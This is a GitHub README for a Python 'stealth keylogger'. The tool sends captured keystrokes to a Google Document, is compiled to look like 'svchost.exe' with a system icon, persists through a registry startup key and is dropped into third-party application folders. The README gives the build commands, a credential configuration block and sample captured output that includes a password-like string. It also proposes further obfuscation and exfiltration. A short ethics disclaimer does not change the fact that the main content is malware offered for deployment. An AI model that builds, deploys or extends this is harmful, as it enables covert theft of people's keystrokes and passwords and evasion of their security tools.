# 🕵️‍♂️ Stealth Keylogger Project

This repository contains a Python-based **stealth keylogger** that logs displayable characters and uploads them to a **Google Document** using the Google Docs API. It is compiled into an executable (`svchost.exe`) for stealth deployment and persistence on Windows systems.

---

## 🚀 Features

- ⌨️ Logs all **visible characters** using `pynput`
- ☁️ **Uploads logs** to a specified Google Document via Google Docs API
- 📂 **Copies itself** to `C:\Users\Public\TempService` for persistence
- 🔁 **Adds to Windows startup** via Registry key
- 🕶️ Runs **stealthily**, including across system reboots
- 🖼️ Customizable with a **system-like icon** for Task Manager disguise
- 🕵️‍♂️ Runs stealthily even after user shutdown and reopening of the PC due to persistent registry startup
- 🧱 Supports **application-level injection** by dropping `svchost.exe` into third-party directories

---

## ⚙️ Installation

### 1. Clone the repository

```bash
git clone https://github.com/Hemantabhusal/Stealth_Keylogger.git
cd stealth_keylogger
```

### 2. Install dependencies

```bash
pip install pynput google-auth google-auth-oauthlib google-auth-httplib2 google-api-python-client pyinstaller
```

### 3. Compile to an executable

```bash
pyinstaller --onefile --noconsole --icon=system.ico --name=svchost keylogger.py
```

> 🔔 Replace `system.ico` with an actual Windows system icon (e.g., extracted from `shell32.dll`)

---

## 📤 Output Example

The keylogger captures characters and appends them to the configured Google Document. Example document output might look like:

```text
Hello World
This is a test
9826498836
Azimuthal@999
```

- Each line represents a sequence of keystrokes separated by **Enter** or **Space**.
- The log buffer is cleared **every 5 min** after a successful upload.
  - You can configure this in the code using:  
    ```python
    time.sleep(300)
    ```

---

## 🧠 Usage

- Run the compiled `svchost.exe` from the `dist/` folder:

```bash
cd dist
./svchost.exe
```

- On execution:
  - Copies itself to: `C:\Users\Public\TempService`
  - Registers for startup using Windows Registry
  - Begins logging and uploading keystrokes to the Google Document (see `DOC_ID`)

---

## 🧬 Injection Capability

You may "inject" the keylogger by placing `svchost.exe` into folders/nested subfolder of legitimate or third-party apps, such as:

```text
C:\Program Files\AppName\
C:\Users\<User>\AppData\Roaming\SomeApp\
```

> Ensure proper execution rights and that antivirus exclusions (if any) are configured.

---

## 🔧 Configuration

Update your **Google API credentials** and document ID inside `keylogger.py`:

```python
CLIENT_ID = "your_client_id"
CLIENT_SECRET = "your_client_secret"
ACCESS_TOKEN = "your_access_token"
REFRESH_TOKEN = "your_refresh_token"
DOC_ID = "your_google_doc_id"
```

> ⚠️ **Important:** Google Docs is not secure for storing sensitive data. For **end-to-end encrypted (E2E)** alternatives, consider integrating:
> - [Proton Drive](https://proton.me/)
> - [Standard Notes](https://standardnotes.com/)
> - [Internxt](https://internxt.com/)

These require additional API setup for secure, trace-free logging.

---

## 📌 Notes

- 🔒 **Admin privileges may required** for registry operations and directory writing
- 🛡️ **Antivirus/Firewall** software may block execution — disable temporarily for testing (with caution)
- 🧪 Do **NOT** use this on systems without **explicit user consent**

---

## ⚠️ Ethical Use Disclaimer

> **⚠️ This tool is for educational, ethical research, or authorized corporate monitoring only. Unauthorized use is illegal and unethical. Misuse can lead to criminal charges.**

---

## 📁 Project Structure

```text
stealth_keylogger/
├── keylogger.py         # Core keylogger script
├── system.ico           # Icon used for stealth disguise (optional)
├── requirements.txt     # All required dependencies
├── README.md            # Project documentation
```



## 🙋‍♀️ Contributing

Pull requests are welcome for:
- API enhancements
- Better encryption integrations
- Cross-platform support

> Please follow standard Python practices (PEP8) and clearly document your changes.


---

## 🔐 Want More Stealth?

Consider adding:
- 🔇 Key filtering (ignore system keys)
- 🧊 Obfuscated strings
- 🔁 HTTP/TLS data exfiltration
- 🛠️ XOR or AES-based local logging before upload

---

**Use responsibly. Learn deeply. Build ethically.**
